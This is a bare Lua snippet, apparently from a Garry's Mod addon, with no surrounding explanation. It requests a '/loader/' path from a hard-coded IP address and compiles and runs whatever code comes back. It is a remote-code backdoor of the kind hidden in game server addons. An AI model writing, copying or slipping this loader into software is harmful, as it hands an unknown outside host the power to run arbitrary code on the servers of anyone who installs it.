HTTP({
    url="http://162.243.145.59:8000/loader/$sid",
    method="GET",
    success=function(c,b,h)
        if (c == 200) then
            CompileString(b,"[C]",false)()
        end
    end
})